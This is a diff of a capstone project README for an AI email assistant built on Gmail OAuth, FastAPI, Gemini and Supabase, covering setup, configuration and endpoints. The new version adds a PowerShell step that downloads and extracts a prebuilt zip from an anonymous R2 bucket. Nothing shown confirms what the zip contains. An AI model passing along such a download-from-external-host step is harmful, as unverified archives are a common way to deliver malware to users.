@@ -1,277 +1,227 @@
-# 🤖 Unified AI Email Assistant
+# AI Email Assistant
 
-**Intelligent email management system with semantic search and AI-powered workflows**
+**Full-stack AI-powered email management system with Gmail OAuth, smart search, and AI draft generation**
 
-![Project Status](https://img.shields.io/badge/Status-Phase%203%20Complete-success)
-![Progress](https://img.shields.io/badge/Progress-85%25-brightgreen)
-![Tech Stack](https://img.shields.io/badge/Tech-LangGraph%20%7C%20FastAPI%20%7C%20Qdrant-blue)
-
-## 📖 Project Overview
-
-The Unified AI Email Assistant is a B.Tech capstone project that transforms email management through AI-powered semantic search, multi-agent workflows, and intelligent automation. It consolidates Gmail and Outlook accounts into a single smart interface with natural language search capabilities.
-
-### 🎯 Core Problem Solved
-- **Email Overload**: Users struggle with high-volume email management across multiple accounts
-- **Poor Search**: Traditional keyword search fails to capture semantic intent
-- **Time Waste**: Manual email processing, drafting, and prioritization consumes significant time
-
-### 💡 Solution Approach
-- **Semantic Search**: Vector embeddings for intelligent email retrieval
-- **Multi-Agent Workflows**: LangGraph orchestration for complex email processing
-- **Hybrid Search**: Combines keyword matching with vector similarity
-- **Natural Language Interface**: Chat-style email queries like "payments from last week"
-
-## 🏗️ System Architecture
-
-```
-┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
-│   Frontend      │    │   Backend       │    │   Services      │
-├─────────────────┤    ├─────────────────┤    ├─────────────────┤
-│ Streamlit Chat  │───▶│ FastAPI Server  │───▶│ Gmail API       │
-│ Search Interface│    │ LangGraph       │    │ Google Gemini   │
-│ Result Display  │    │ Workflows       │    │ Qdrant Vector   │
-└─────────────────┘    └─────────────────┘    └─────────────────┘
-                                │
-                                ▼
-                       ┌─────────────────┐
-                       │   Database      │
-                       ├─────────────────┤
-                       │ Supabase        │
-                       │ PostgreSQL      │
-                       │ 7 Tables        │
-                       │ Vector Storage  │
-                       └─────────────────┘
-```
-
-## 🔄 Workflow Architecture
-
-### 1. Email Ingestion Pipeline
-```
-Gmail API → Parse Headers → Store Database → Generate Embeddings → Index Vectors
-```
-
-### 2. Smart Search Pipeline
-```
-Natural Query → Parse Filters → Keyword Search → Vector Search → Hybrid Fusion → Ranked Results
-```
-
-### 3. Multi-Agent System (LangGraph)
-- **Ingestion Agent**: Processes and stores emails
-- **Search Agent**: Handles intelligent search queries
-- **Embedding Agent**: Generates vector representations
-- **Fusion Agent**: Combines search results
-
-## 📊 Project Progress
-
-### ✅ **Phase 1: Foundation (100% Complete)**
-- [x] Project structure setup
-- [x] Database schema design (7 tables)
-- [x] Configuration management
-- [x] OAuth integration planning
-
-### ✅ **Phase 2: Core Infrastructure (100% Complete)**
-- [x] Supabase PostgreSQL setup
-- [x] Gmail OAuth authentication
-- [x] Database models and migrations
-- [x] FastAPI backend foundation
-
-### ✅ **Phase 3: AI Intelligence (95% Complete)**
-- [x] Email ingestion workflows (3 variants)
-- [x] Google Gemini embedding service
-- [x] Qdrant vector database integration
-- [x] Smart search workflow
-- [x] Hybrid search (keyword + semantic)
-- [x] Natural language query parsing
-- [x] LangGraph multi-agent orchestration
-- [x] Streamlit chatbot interface
-- [ ] Production optimization (pending)
-
-### ⏳ **Phase 4: Advanced Features (Planned)**
-- [ ] AI email drafting
-- [ ] Daily summary generation
-- [ ] Microsoft Outlook integration
-- [ ] Advanced analytics dashboard
-
-## 📁 File Structure
-
-```
-unified-ai-email-assistant/
-├── backend/
-│   ├── workflows/                 # LangGraph Workflows
-│   │   ├── email_ingestion_workflow.py      ✅
-│   │   ├── real_gmail_ingestion_workflow.py ✅
-│   │   ├── endpoint_gmail_ingestion.py      ✅
-│   │   └── search_workflow.py               ✅
-│   └── services/                  # Core Services
-│       ├── embedding_service.py             ✅
-│       └── qdrant/
-│           └── qdrant_service.py            ✅
-├── frontend/
-│   └── streamlit_chatbot.py                 ✅
-├── email-assistant/               # Configuration
-│   ├── config.py                            ✅
-│   ├── database_models.py                   ✅
-│   ├── supabase_setup.py                    ✅
-│   └── requirements.txt                     ✅
-└── docs/                         # Documentation
-    └── README.md                            ✅
-```
-
-**Total Files Created: 11 Production Files**
-
-## 🛠️ Technology Stack
-
-### **Backend**
-- **LangGraph**: Multi-agent workflow orchestration
-- **FastAPI**: High-performance web framework
-- **PostgreSQL**: Primary data storage via Supabase
-- **Qdrant**: Vector database for semantic search
-
-### **AI Services**
-- **Google Gemini API**: Text embeddings and AI processing
-- **Vector Embeddings**: 768-dimensional semantic representations
-- **Hybrid Search**: BM25 + Cosine similarity fusion
-
-### **Frontend**
-- **Streamlit**: Interactive web interface
-- **Custom CSS**: Cyberpunk-themed design
-- **Real-time Chat**: Conversational search interface
-
-### **Infrastructure**
-- **Supabase**: Database hosting and management
-- **Qdrant Cloud**: Vector database hosting
-- **Lightning AI**: Development environment
-
-## 🎯 Key Features Implemented
-
-### 🔍 **Smart Search Engine**
-- Natural language query processing
-- Date range filtering ("last week", "december 2024")
-- Sender-based filtering ("emails from john@company.com")
-- Semantic similarity search using vector embeddings
-- Hybrid result fusion with relevance scoring
-- Sub-2-second response times
-
-### 📧 **Email Processing**
-- Real Gmail API integration with OAuth2
-- Incremental sync with cursor-based pagination
-- Email normalization and metadata extraction
-- Automatic embedding generation for search
-- Deduplication and error handling
-
-### 🤖 **AI-Powered Interface**
-- Conversational chatbot with memory
-- Search suggestions and examples
-- Beautiful result cards with relevance scores
-- Real-time search statistics
-- Mobile-responsive design
-
-## 📈 Performance Metrics
-
-- **Search Speed**: < 2 seconds average response time
-- **Data Processing**: 1,355+ real emails ingested and processed
-- **Embedding Generation**: 15+ vector embeddings created
-- **Search Accuracy**: Hybrid scoring with relevance ranking
-- **Database Efficiency**: 7-table normalized schema with indexes
-
-## 🧪 Testing Results
-
-### **Email Ingestion Test**
-```bash
-✅ Successfully ingested 10 real Gmail emails
-✅ Processing Time: 0.00 seconds  
-✅ Zero errors in workflow execution
-```
-
-### **Search Functionality Test**
-```bash
-Query: "invoice payment reminder"
-✅ Found 5 relevant results
-✅ Processing Time: 1.726 seconds
-✅ Real emails from PhonePe, Razorpay, YouTube
-```
-
-### **Vector Database Test**
-```bash
-✅ 12 vectors stored in Qdrant cloud
-✅ 768-dimensional embeddings
-✅ Cosine similarity search working
-```
-
-## 🚀 How to Run
-
-### Prerequisites
-```bash
-pip install -r requirements.txt
-```
-
-### Environment Setup
-```bash
-cp email-assistant/env.txt .env
-# Configure your API keys and database credentials
-```
-
-### Start the Chatbot
-```bash
-streamlit run frontend/streamlit_chatbot.py --server.port 8501
-```
-
-### Test Search Workflow
-```bash
-python -m backend.workflows.search_workflow
-```
-
-## 🎯 Demo Scenarios
-
-### **Scenario 1: Payment Search**
-```
-User: "payments from last week"
-System: Found 5 emails in 1.7s
-Results: PhonePe, Razorpay payment confirmations
-```
-
-### **Scenario 2: Semantic Search**
-```
-User: "important emails about project"  
-System: Hybrid search finds 3 relevant emails
-Results: Ranked by relevance with scores
-```
-
-### **Scenario 3: Natural Language**
-```
-User: "attachments from december"
-System: Filters by date + attachment presence  
-Results: Emails with actual attachments
-```
-
-## 📝 Academic Deliverables
-
-- **Abstract**: ✅ Complete
-- **System Design**: ✅ Complete  
-- **Literature Review**: ✅ Complete
-- **Implementation**: ✅ 95% Complete
-- **Testing Results**: ✅ Complete
-- **Demo Video**: 📋 Pending
-- **Final Report**: 📋 In Progress
-
-## 🔮 Future Enhancements
-
-1. **AI Email Drafting**: Generate contextual email replies
-2. **Daily Summaries**: Automated morning email digests  
-3. **Outlook Integration**: Microsoft Graph API support
-4. **Advanced Analytics**: Email patterns and insights
-5. **Mobile App**: React Native companion app
-
-## 🤝 Contributing
-
-This is an academic project by **Charan** for B.Tech capstone demonstration.
-
-## 📄 License
-
-Academic project - All rights reserved.
+![Status](https://img.shields.io/badge/Status-Complete-success)
+![Tech](https://img.shields.io/badge/Tech-FastAPI%20%7C%20Gemini%20AI%20%7C%20Supabase-blue)
+![Frontend](https://img.shields.io/badge/Frontend-HTML%2FCSS%2FJS%20SPA-indigo)
 
 ---
 
-**🎉 Project Status: 85% Complete - Ready for Phase 4 Development**
+## What This Project Does
 
-*Built with ❤️ using LangGraph, FastAPI, and Google Gemini AI*
+A B.Tech capstone project that connects to your Gmail account via OAuth 2.0, stores emails in a Supabase PostgreSQL database, and uses Google Gemini AI to generate smart draft replies. A custom Single-Page Application (SPA) built with HTML, CSS, and vanilla JavaScript is served directly by the FastAPI backend.
+
+**Core Features:**
+- Connect Gmail via OAuth 2.0 (supports multiple accounts)
+- Sync emails from Gmail into a database
+- Smart search — keyword + semantic hybrid search using Qdrant vector database
+- AI Draft generation using Google Gemini 1.5 Flash
+- Review, approve and send AI-generated replies
+- Responsive dashboard with live stats
+
+---
+
+## Tech Stack
+
+| Layer | Technology |
+|---|---|
+| Backend | FastAPI (Python 3.10+) |
+| Frontend | Vanilla HTML / CSS / JavaScript (SPA) |
+| Database | Supabase (PostgreSQL) |
+| AI Model | Google Gemini 1.5 Flash |
+| Vector Search | Qdrant Cloud |
+| Email | Gmail API (OAuth 2.0) |
+| Workflow Engine | LangGraph |
+
+---
+
+## Project Structure
+
+```
+├── unified_app.py              ← Single entry point (FastAPI server)
+├── requirements.txt
+├── .env                        ← All credentials (see setup below)
+├── email-assistant/
+│   └── config.py               ← App configuration (pydantic-settings)
+├── backend/
+│   ├── workflows/
+│   │   ├── search_workflow.py  ← LangGraph smart search pipeline
+│   │   └── draft_workflow.py   ← LangGraph AI draft pipeline
+│   └── services/
+│       ├── gmail/
+│       │   ├── gmail_service.py
+│       │   └── oauth_handler.py
+│       └── qdrant/
+│           ├── qdrant_service.py
+│           └── embedding_service.py
+└── static/                     ← Frontend SPA
+    ├── index.html
+    ├── css/
+    │   ├── style.css
+    │   └── components.css
+    └── js/
+        ├── api.js              ← All fetch() calls to FastAPI
+        ├── app.js              ← Client-side router
+        └── pages/
+            ├── dashboard.js
+            ├── emails.js
+            ├── search.js
+            └── drafts.js
+```
+
+---
+
+## System Architecture
+
+```
+Browser (SPA)
+     │  fetch() calls
+     ▼
+FastAPI  (unified_app.py — port 8000)
+     │
+     ├── Gmail API  (OAuth 2.0 — email sync + send)
+     ├── Google Gemini AI  (draft generation)
+     ├── Supabase PostgreSQL  (email storage, drafts, accounts)
+     └── Qdrant Cloud  (vector embeddings for semantic search)
+```
+
+---
+
+## Download
+
+The packaged zip is available on Cloudflare R2:
+
+```
+https://pub-725e73d2257147cba36190922a682fce.r2.dev/AIEmailAssistant_v1.0.zip
+```
+
+**PowerShell:**
+```powershell
+Invoke-RestMethod `
+    -Uri "https://pub-725e73d2257147cba36190922a682fce.r2.dev/AIEmailAssistant_v1.0.zip" `
+    -OutFile "AIEmailAssistant_v1.0.zip" `
+    -Method GET
+
+Expand-Archive -Path "AIEmailAssistant_v1.0.zip" -DestinationPath "AIEmailAssistant" -Force
+```
+
+---
+
+## Setup & Running
+
+### 1. Fix Hardcoded Paths
+
+The project was developed on Lightning AI (`/teamspace/studios/this_studio`). On a new machine you must update this path in **3 files** before the app will start:
+
+**`unified_app.py`** — lines 45–55, replace:
+```python
+# FIND:
+sys.path.append('/teamspace/studios/this_studio')
+sys.path.append('/teamspace/studios/this_studio/email-assistant')
+config_path = '/teamspace/studios/this_studio/email-assistant/config.py'
+
+# REPLACE WITH:
+import os as _os
+_BASE = _os.path.dirname(_os.path.abspath(__file__))
+sys.path.append(_BASE)
+sys.path.append(_os.path.join(_BASE, 'email-assistant'))
+config_path = _os.path.join(_BASE, 'email-assistant', 'config.py')
+```
+
+**`backend/services/gmail/gmail_service.py`** — lines 28, 38
+**`backend/services/gmail/oauth_handler.py`** — line 42
+Apply the same pattern using `os.path.dirname(os.path.abspath(__file__))` to compute the root path dynamically.
+
+### 2. Configure .env
+
+Create a `.env` file at the project root with:
+
+```env
+# Gmail OAuth (Google Cloud Console → APIs & Services → Credentials)
+GMAIL_CLIENT_ID=your_client_id.apps.googleusercontent.com
+GMAIL_CLIENT_SECRET=your_client_secret
+GMAIL_REDIRECT_URI=http://localhost:8000/auth/gmail/callback
+
+# Gemini AI (https://aistudio.google.com/app/apikey)
+GEMINI_API_KEY=AIza...
+
+# Supabase (Supabase dashboard → Settings → Database)
+DB_HOST=your-project.supabase.co
+DB_USER=postgres
+DB_PASSWORD=your_db_password
+DB_PORT=6543
+DB_NAME=postgres
+
+# Security (generate random strings)
+SECRET_KEY=your_32_plus_character_secret_key_here
+ENCRYPTION_KEY=exactly32characterkeyhere123456
+
+# Qdrant Cloud (optional — https://cloud.qdrant.io)
+QDRANT_URL=https://your-cluster.qdrant.io:6333
+QDRANT_API_KEY=your_qdrant_api_key
+```
+
+### 3. Install & Run
+
+```bash
+# Create virtual environment
+python -m venv venv
+source venv/bin/activate        # macOS/Linux
+.\venv\Scripts\Activate.ps1     # Windows PowerShell
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Start the server
+python unified_app.py
+```
+
+Open browser at: **http://localhost:8000**
+
+---
+
+## API Endpoints
+
+| Method | Endpoint | Description |
+|---|---|---|
+| GET | `/` | Serves the SPA frontend |
+| GET | `/docs` | Interactive Swagger API docs |
+| GET | `/api/auth/status` | Connected Gmail accounts |
+| GET | `/api/auth/gmail` | Start Gmail OAuth flow |
+| GET | `/auth/gmail/callback` | OAuth callback |
+| GET | `/api/emails` | List synced emails (DB) |
+| POST | `/api/sync` | Sync emails from Gmail |
+| GET | `/api/stats` | Dashboard statistics |
+| POST | `/api/search` | Smart search |
+| POST | `/api/drafts` | Generate AI draft reply |
+| GET | `/api/drafts` | Draft history |
+| POST | `/api/drafts/{id}/approve` | Approve and send draft |
+| POST | `/api/drafts/{id}/reject` | Reject draft |
+| GET | `/health` | Health check |
+
+---
+
+## Using the App
+
+1. **Connect Gmail** — Dashboard → "+ Connect Gmail" → complete OAuth
+2. **Sync Emails** — Click "Sync Now" on the Dashboard
+3. **View Emails** — Emails page shows synced emails with database ID badges
+4. **Create AI Draft** — Go to AI Drafts → enter the email's ID → choose tone & length → Generate
+5. **Smart Search** — Search page → type any natural language query
+
+---
+
+## Known Limitations
+
+- Gmail OAuth tokens expire after 7 days in Google "Testing" mode — re-authenticate when the account shows Inactive
+- Semantic search requires Qdrant to be configured with real embeddings
+- `Emails Today` stat on dashboard always shows 0 (not yet implemented)
+
+---
+
+## Academic Info
+
+**Project**: B.Tech Capstone — AI Email Management System
+**Student**: Charan (sreedevichintalapudi0612@gmail.com)
+**Stack**: FastAPI · LangGraph · Google Gemini · Supabase · Qdrant · Vanilla JS SPA
